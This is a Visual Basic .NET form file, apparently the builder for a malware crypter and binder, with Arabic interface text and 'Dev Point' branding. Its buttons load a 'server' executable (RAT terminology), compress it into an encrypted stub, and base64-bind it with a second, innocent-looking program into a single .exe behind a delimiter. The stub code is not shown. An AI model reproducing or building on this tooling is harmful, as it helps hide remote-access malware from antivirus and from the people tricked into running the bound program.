﻿Imports System.IO
Public Class Form1
    Dim y As String = "qwert"
    Public STUB As String
    Dim O1, O2 As New OpenFileDialog
    Dim AA As New SaveFileDialog

    Private Sub DevSkin1_Click(sender As Object, e As EventArgs) Handles DevSkin1.Click

    End Sub

    Private Sub DevButton2_Click(sender As Object, e As EventArgs) Handles DevButton2.Click
        DevTextBox3.Text = keyc.Key
    End Sub

    Private Sub DevButton3_Click(sender As Object, e As EventArgs) Handles DevButton3.Click
        DevTextBox4.Text = keyc1.Key
    End Sub

    Private Sub DevButton5_Click(sender As Object, e As EventArgs) Handles DevButton5.Click
        Dim kbytes() As Byte
        Dim ebytes() As Byte
        Dim SVD As New SaveFileDialog
        With SVD
            .Title = "اختر مكان حفظ السيرفر المشفر"
            .Filter = "تطبيقات|*.exe"
            .ShowDialog()
        End With
        kbytes = IO.File.ReadAllBytes(DevTextBox1.Text)
        ebytes = Compression.Compress(kbytes)
        IO.File.WriteAllBytes(SVD.FileName, My.Resources.newsstub)
        WriteResource(SVD.FileName, ebytes)
        MsgBox(".. Dev Point ..")
    End Sub

    Private Sub DevButton1_Click(sender As Object, e As EventArgs) Handles DevButton1.Click
        Dim OpenFD As New OpenFileDialog
        With OpenFD
            .Title = "Add Server"
            .Filter = "تطبيقات|*.exe"
            .ShowDialog()
        End With
        DevTextBox1.Text = OpenFD.FileName
    End Sub

    Private Sub DevButton6_Click(sender As Object, e As EventArgs) Handles DevButton6.Click
        With O1
            .Filter = "Appliction|*.exe"
        End With
        If O1.ShowDialog = Windows.Forms.DialogResult.OK Then
            DevTextBox5.Text = O1.FileName
        Else
            Exit Sub
        End If
    End Sub

    Private Sub DevButton7_Click(sender As Object, e As EventArgs) Handles DevButton7.Click
        With O2
            .Filter = "Appliction|*.exe"
        End With
        If O2.ShowDialog = Windows.Forms.DialogResult.OK Then
            DevTextBox6.Text = O2.FileName
        Else
            Exit Sub
        End If
    End Sub

    Private Sub DevButton8_Click(sender As Object, e As EventArgs) Handles DevButton8.Click
        If O1.FileName.Length > 0 And O2.FileName.Length > 0 Then
            With AA
                .Filter = "Appliction |*.exe"
                If (.ShowDialog = Windows.Forms.DialogResult.OK) Then
                    Dim server, program As String

                    server = Convert.ToBase64String(IO.File.ReadAllBytes(O1.FileName))
                    program = Convert.ToBase64String(IO.File.ReadAllBytes(O2.FileName))

                    FileOpen(1, AA.FileName, OpenMode.Binary)
                    FilePut(1, My.Resources.stubcom)
                    FilePut(1, y & server) ' 1
                    FilePut(1, y & program)
                    FileClose(1)
                    MsgBox(AA.FileName)
                End If
            End With
        Else
            MsgBox(".. Dev Point ..")
        End If
    End Sub

    Private Sub DevButton9_Click(sender As Object, e As EventArgs) Handles DevButton9.Click
        Me.Hide()
        Form2.Show()
    End Sub
End Class
